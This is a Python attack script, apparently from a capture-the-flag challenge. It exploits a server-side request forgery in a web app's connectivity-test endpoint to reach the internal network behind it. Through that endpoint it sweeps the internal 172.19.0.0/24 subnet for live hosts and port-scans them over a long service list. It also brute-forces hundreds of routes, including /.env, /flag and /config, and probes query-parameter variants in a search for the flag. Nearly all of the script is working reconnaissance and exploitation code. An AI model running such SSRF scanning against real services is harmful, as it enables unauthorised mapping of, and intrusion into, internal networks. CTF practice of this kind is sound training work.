#!/usr/bin/env python3
import concurrent.futures
import json
import os
import re
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request

HOST = "9taux6shw8cpbvs5.instances.ctfcup.online"
BASE = f"http://{HOST}"
OUT = "/tmp/web-out"
os.makedirs(OUT, exist_ok=True)
JSONL = os.path.join(OUT, "probe4.jsonl")
SUMMARY = os.path.join(OUT, "SUMMARY4.txt")
ctx = ssl._create_unverified_context()
FLAG_RE = re.compile(r"ctfcup\{[^}]+\}")
jsonl_f = open(JSONL, "w", encoding="utf-8", buffering=1)
summary_f = open(SUMMARY, "w", encoding="utf-8", buffering=1)

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

opener = urllib.request.build_opener(NoRedirect, urllib.request.HTTPSHandler(context=ctx))

def emit(rec):
    rec = dict(rec)
    if isinstance(rec.get("body"), str) and len(rec["body"]) > 30000:
        rec["body"] = rec["body"][:30000]
        rec["truncated"] = True
    line = json.dumps(rec, ensure_ascii=False)
    jsonl_f.write(line + "\n")
    flags = FLAG_RE.findall(line)
    if flags:
        summary_f.write(f"FLAG {flags} :: {line[:10000]}\n")
    summary_f.flush()
    return rec

def note(text):
    print(text, flush=True)
    summary_f.write(text + "\n")
    summary_f.flush()

def section(title):
    note(f"\n===== {title} =====")

def call_ssrf(target, timeout=10):
    q = urllib.parse.urlencode({"target": target})
    url = f"{BASE}/api/diagnostics/connectivity-test?{q}"
    req = urllib.request.Request(
        url,
        headers={"User-Agent": "Mozilla/5.0 targeted-17219", "Accept": "application/json"},
    )
    started = time.time()
    try:
        with opener.open(req, timeout=timeout) as r:
            raw = r.read(1_000_000)
            outer = r.status
    except urllib.error.HTTPError as e:
        raw = e.read(1_000_000)
        outer = e.code
    except Exception as e:
        return {"target": target, "kind": "outer-error", "error": f"{type(e).__name__}: {e}", "elapsed": round(time.time()-started,3)}
    elapsed = round(time.time() - started, 3)
    try:
        data = json.loads(raw.decode("utf-8", "replace"))
    except Exception:
        return {"target": target, "kind": "outer-nonjson", "outer_status": outer, "body": raw.decode("utf-8","replace")[:30000], "elapsed": elapsed}
    if "body" in data or isinstance(data.get("status"), int):
        kind = "http"
    else:
        err = str(data.get("error", ""))
        if "Connection refused" in err:
            kind = "refused"
        elif "name resolution" in err:
            kind = "dns"
        elif "timed out" in err:
            kind = "timeout"
        elif "No route to host" in err:
            kind = "noroute"
        elif "Connection reset" in err or "Remote end closed" in err or "EOF" in err:
            kind = "reset"
        else:
            kind = "error"
    return {"target": target, "kind": kind, "outer_status": outer, "elapsed": elapsed, **data}

def ssrf(host, port, path="/"):
    return call_ssrf(f"http://mme-monitor@{host}:{port}{path}")

def run_map(jobs, fn, label, workers=18, interesting=None):
    results = []
    start = time.time()
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(fn, job): job for job in jobs}
        for i, fut in enumerate(concurrent.futures.as_completed(futs), 1):
            try:
                rec = fut.result()
            except Exception as e:
                rec = {"target": str(futs[fut]), "kind": "worker-error", "error": repr(e)}
            rec["phase"] = label
            emit(rec)
            results.append(rec)
            if interesting and interesting(rec):
                note("HIT " + json.dumps(rec, ensure_ascii=False)[:8000])
            if i % 100 == 0 or i == len(jobs):
                print(f"[{label}] {i}/{len(jobs)} elapsed={time.time()-start:.1f}s", flush=True)
    return results

def host_of(target):
    return urllib.parse.urlparse(target or "").hostname

def port_of(target):
    return urllib.parse.urlparse(target or "").port

# 1. Full 172.19.0.0/24 host discovery. Port 8080 gives refused on live
# hosts that don't run the web panel; absent bridge addresses time out.
section("HOST DISCOVERY 172.19.0.0/24 :8080")
hosts = [f"172.19.0.{i}" for i in range(1, 255)]
disc = run_map(
    hosts,
    lambda h: ssrf(h, 8080, "/health"),
    "17219-discovery",
    workers=24,
    interesting=lambda r: r.get("kind") in {"http", "refused", "reset"},
)
live_hosts = sorted(
    {host_of(r.get("target")) for r in disc if r.get("kind") in {"http", "refused", "reset"}},
    key=lambda x: tuple(map(int, x.split("."))),
)
note("LIVE HOSTS: " + ", ".join(live_hosts))

# 2. Ports on live hosts. Use a focused but broad list, including contiguous
# web/service ranges and telecom-flavoured TCP ports.
section("PORT SCAN LIVE 172.19 HOSTS")
ports = set([
    21,22,23,25,53,67,69,80,81,88,110,111,123,135,139,143,161,179,389,427,
    443,445,465,500,514,515,587,623,631,873,993,995,1025,1080,1194,1433,
    1521,1723,1883,2049,2123,2152,2181,2222,2375,2376,3128,3306,3389,
    3868,4369,5044,5060,5061,5432,5672,5900,6379,6443,7070,7500,8025,
    8060,8070,8333,8443,8500,8888,9042,9100,9200,9300,10000,10250,11211,
    15672,27017,36412,61616,
])
for a,b in [(3000,3010),(4000,4100),(5000,5100),(6000,6100),(7000,7100),(8000,8200),(9000,9200),(10000,10100),(18080,18090)]:
    ports.update(range(a,b+1))
ports = sorted(ports)
port_jobs = [(h,p) for h in live_hosts for p in ports]
port_results = run_map(
    port_jobs,
    lambda hp: ssrf(hp[0], hp[1], "/"),
    "17219-ports",
    workers=22,
    interesting=lambda r: r.get("kind") not in {"refused", "dns", "noroute"},
)
http_endpoints = sorted({(host_of(r.get("target")), port_of(r.get("target"))) for r in port_results if r.get("kind") == "http"})
note("HTTP ENDPOINTS: " + ", ".join(f"{h}:{p}" for h,p in http_endpoints))
nonhttp = [r for r in port_results if r.get("kind") in {"reset", "timeout", "error"}]
if nonhttp:
    note("NON-HTTP/TIMEOUT PORT OBSERVATIONS:")
    for r in sorted(nonhttp, key=lambda x: x.get("target", "")):
        note(json.dumps(r, ensure_ascii=False)[:2000])

# Always include manually observed endpoints in case a transient timeout hid
# one during the parallel scan.
for ep in [("172.19.0.2",8081),("172.19.0.5",8082),("172.19.0.4",8080)]:
    if ep not in http_endpoints:
        http_endpoints.append(ep)
http_endpoints = sorted(set(http_endpoints))

# 3. Route scan each HTTP endpoint. Generic Flask 404 is ignored; 405 and
# any JSON/error differences are kept, revealing POST-only service routes.
section("ROUTE SCAN HTTP ENDPOINTS")
roots = [
    "", "api", "internal", "maintenance", "support", "field-support", "dispatch",
    "mme", "monitor", "s1", "s1ap", "NAS", "emm", "esm", "session", "sessions",
    "echo", "diagnostics", "diag", "tickets", "ticket", "console", "terminal",
    "service", "management", "core", "subscriber", "device", "femtocell", "radio",
    "admin", "private", "service-request", "attach", "identity", "guti", "legacy",
    "old-session", "hss", "sgw", "pgw", "register", "registration", "auth",
]
subs = [
    "", "/", "/health", "/healthz", "/ready", "/status", "/info", "/version",
    "/config", "/ticket", "/tickets", "/active", "/current", "/latest", "/issue",
    "/new", "/create", "/verify", "/validate", "/auth", "/login", "/unlock",
    "/session", "/sessions", "/echo", "/send", "/message", "/messages", "/request",
    "/attach", "/service-request", "/identity", "/guti", "/imsi", "/subscriber",
    "/subscribers", "/connect", "/connection", "/register", "/registration",
]
paths = {"/" + (f"{r}{s}" if r else s.lstrip('/')) for r in roots for s in subs}
# Add prefixed variants for service concepts.
concepts = [
    "maintenance/ticket", "maintenance/tickets", "support/tickets", "dispatch/tickets",
    "field-support/tickets", "tickets/active", "tickets/current", "tickets/latest",
    "tickets/FEMTO-042", "maintenance/FEMTO-042", "device/FEMTO-042",
    "sessions/active", "sessions/old", "sessions/legacy", "session/active",
    "s1ap/echo", "NAS/echo", "mme/status", "mme/health", "monitor/health",
]
for c in concepts:
    paths.add("/" + c)
    paths.add("/api/" + c)
    paths.add("/internal/" + c)
paths.update({
    "/", "/health", "/robots.txt", "/openapi.json", "/swagger.json", "/docs", "/redoc",
    "/.env", "/flag", "/flag.txt", "/metrics", "/debug", "/config", "/env",
    "/static/dashboard.js", "/api/docs", "/api/openapi.json",
})
paths = sorted(paths)

def route_interesting(rec):
    if rec.get("kind") != "http":
        return rec.get("kind") not in {"refused", "dns", "noroute"}
    body = rec.get("body", "") or ""
    if rec.get("status") == 404 and "The requested URL was not found" in body:
        return False
    if rec.get("status") == 404 and len(body) == 207 and "Not Found" in body:
        return False
    return True

for host, port in http_endpoints:
    section(f"ROUTES {host}:{port} ({len(paths)} paths)")
    run_map(
        paths,
        lambda path, host=host, port=port: ssrf(host, port, path),
        f"routes-{host}-{port}",
        workers=18,
        interesting=route_interesting,
    )

# 4. Query-parameter variants on likely ticket/session routes. These can
# reveal required parameters even if the bare route returns a generic error.
section("LIKELY ROUTE QUERY VARIANTS")
query_paths = []
base_qpaths = [
    "/api/tickets", "/tickets", "/ticket", "/api/ticket", "/internal/tickets",
    "/internal/ticket", "/maintenance/ticket", "/maintenance/tickets",
    "/api/maintenance/tickets", "/api/sessions", "/sessions", "/api/session",
]
queries = [
    "device=FEMTO-042", "device_id=FEMTO-042", "deviceId=FEMTO-042",
    "femtocell=FEMTO-042", "id=FEMTO-042", "active=true", "status=active",
    "device=FEMTO-042&active=true", "device_id=FEMTO-042&status=active",
]
for host, port in http_endpoints:
    for bp in base_qpaths:
        for q in queries:
            query_paths.append((host, port, f"{bp}?{q}"))
run_map(
    query_paths,
    lambda j: ssrf(j[0], j[1], j[2]),
    "route-query-variants",
    workers=18,
    interesting=route_interesting,
)

section("DONE")
note("probe4 complete")
jsonl_f.close()
summary_f.close()
